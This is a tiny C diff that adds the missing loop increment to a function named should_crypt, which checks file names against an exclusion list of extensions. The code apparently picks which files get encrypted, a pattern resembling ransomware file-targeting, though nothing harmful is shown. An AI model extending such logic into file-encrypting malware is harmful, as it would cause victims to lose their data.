@@ -2,7 +2,7 @@ char *exclude[]={".pdf",".txt"};
 
 int should_crypt(char *file)
 {
-for(i=0;i!=sizeof(exclude)/sizeof(char*))
+for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
 {
 if(strstr(file,exclude[i])!=NULL)
 {
